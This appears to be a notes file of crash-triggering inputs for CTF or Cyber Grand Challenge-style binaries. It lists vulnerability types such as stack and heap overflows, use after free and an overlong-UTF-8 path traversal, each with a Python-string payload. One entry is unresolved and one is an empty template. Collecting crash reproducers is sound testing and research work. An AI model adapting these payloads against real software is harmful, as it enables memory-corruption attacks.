# Space_Attackers

## Type

Stack based buffer overflow.

## Crash

```python
'magic\n' + ('\n\n\n\nd\n' * 24) + ('\n' * 16) + ((('w\n' * 10) + 's\n') * (280)) + 's\n' + 'd\n' + 'q\n'
```

----

# Fortress

## Type

Heap buffer overflow.

## Crash

```python
"\x10\x87\x04\x08\n-1337\n0\n2\n1\n0\n1\n0\n6\n0\nThis is a great program Love it! Thanks for making this :) G\x24\x35\x06\x08I am done with this-\n6\n1\nHELO\n"
```

----

# electronictrading

TODO: Figure out which vuln this crash is.

## Type

Dereference of untrusted pointer
Integer overflow or wraparound
Improper validation of array index
Heap-based buffer overflow
Use after free
Access of resource using incompatible type

## Crash

```python
"\x03" + "\x00" * 3 + "A" * 4 + "\x00" * 12 + "\x05" + "\x00" * 19
```

----

# UTF-late

## Type

Improper handling of unicode encoding

## Crash

```python
'\x01\x00\x00\x00\x2e\x2e\xc0\xaf\x61\x64\x6d\x69\x6e\xc0\xaf\x41\x41\x41\x41\x00\x04\x00\x00\x00\x42\x42\x42\x42\xff\xff\xff\xff'
```

----

# cotton_swab_arithmetic

## Type

Out-of-Bounds Read or Write

## Crash

```python
'\x26\x00\x02\xff\xff\x10\x00\x22\xff\xff\x01\x00\x07\x00\x00\x05\x00\x00\x48\x22\xff\xff\x00\x00\x0f\x00\x00\x08\x20\x00\x00\x05\x00\x07\x00\x00\x00\x00\xaa\xaa'
```

----

# next


## Type


## Crash



